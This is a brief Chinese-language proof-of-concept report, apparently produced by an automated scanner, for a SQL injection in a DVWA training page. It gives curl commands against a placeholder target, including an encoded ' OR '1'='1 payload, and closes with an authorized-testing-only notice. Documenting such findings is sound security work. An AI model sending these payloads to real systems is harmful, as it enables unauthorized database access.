# POC — DVWA SQL 注入：$_REQUEST['id'] 直接拼接进 SELECT 语句（MySQL/SQLite 双分支）

- finding_id: `LLM-d2344e4ce96f`
- type: `sql_injection` / CWE-89
- severity: `high`
- file: `041.php:11`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/041.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 SQL 注入 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/041.php?id=%27%20OR%20%271%27%3D%271'
```
预期：布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。